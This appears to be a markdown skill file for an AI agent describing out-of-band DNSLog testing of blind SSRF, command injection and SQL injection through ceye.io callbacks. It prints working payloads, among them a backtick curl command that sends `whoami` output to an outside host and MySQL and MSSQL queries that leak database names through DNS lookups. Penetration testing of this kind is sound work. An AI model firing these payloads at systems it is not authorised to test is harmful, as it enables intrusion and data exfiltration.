---
name: ceye-dnslog
description: "DNSLog out-of-band detection — use a configured ceye.io (or compatible) DNS/HTTP callback service to detect blind vulnerabilities like SSRF, XXE, command injection, and SQL injection. Trigger when: blind/out-of-band vulnerability testing, no visible output from injections, SSRF/XXE/command injection/SQL injection detection."
---

# DNSLog / Reverse Connection Detection Skill (ceye.io)

## Overview

DNSLog (also called reverse/OOB detection) detects **blind vulnerabilities** that do not return visible output. Generate a unique subdomain under your configured callback domain, inject it into the target, then poll the provider API for DNS/HTTP callbacks.

## Credentials (user-configured — never hardcode shared tokens)

Obtain Identifier, Domain, and API Token from the user's ceye.io account (or compatible OOB provider). Prefer host settings / secrets when available. Use placeholders:

| Field | Placeholder |
|-------|-------------|
| Identifier | `$CEYE_ID` |
| Domain | `*.$CEYE_ID.ceye.io` |
| API Token | `$CEYE_TOKEN` |
| DNS API | `http://api.ceye.io/v1/records?token=$CEYE_TOKEN&type=dns` |
| HTTP API | `http://api.ceye.io/v1/records?token=$CEYE_TOKEN&type=http` |

If credentials are missing, ask once for the user's Identifier and Token (or stop OOB checks). Do not embed, invent, or reuse another session's token.

## Workflow

### Step 1: Obtain a Unique Identifier

```bash
echo "$(date +%s)$(head -c4 /dev/urandom | xxd -p).$CEYE_ID.ceye.io"
```

### Step 2: Inject the Payload into the Target

Use the generated subdomain (represented as `PAYLOAD.$CEYE_ID.ceye.io` below):

#### Blind SSRF / HTTP Request
```
http://target.com/api?url=http://PAYLOAD.$CEYE_ID.ceye.io
X-Forwarded-For: PAYLOAD.$CEYE_ID.ceye.io
Referer: http://PAYLOAD.$CEYE_ID.ceye.io
```

#### Blind Command Injection
```bash
; ping -c 3 PAYLOAD.$CEYE_ID.ceye.io
| nslookup PAYLOAD.$CEYE_ID.ceye.io
`curl http://PAYLOAD.$CEYE_ID.ceye.io/$(whoami)`
```

#### Blind SQL Injection (examples)
```sql
-- MySQL (Windows UNC, requires privilege)
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.PAYLOAD.$CEYE_ID.ceye.io\\a'));
-- MSSQL
DECLARE @host VARCHAR(800);
SELECT @host = DB_NAME()+'.PAYLOAD.$CEYE_ID.ceye.io';
EXEC('master..xp_dirtree "\\'+@host+'\c$"');
```

### Step 3: Poll for Callbacks

```bash
curl -s "http://api.ceye.io/v1/records?token=$CEYE_TOKEN&type=dns&filter="
curl -s "http://api.ceye.io/v1/records?token=$CEYE_TOKEN&type=http&filter="
```

### Step 4: Interpret Results

- **DNS query received** → target resolved/executed the injected name.
- **Subdomain contains data** → possible data exfiltration via DNS labels.
- **HTTP request received** → outbound HTTP from the target.
- **No callback** → try different points/protocols; do not invent a hit.

## Tips

1. Unique subdomain per injection point.
2. Prefer DNS over HTTP when egress is restricted.
3. Space polls (≥30s) to respect provider rate limits.
4. Server-side callbacks come from the target's IP, not the tester's.
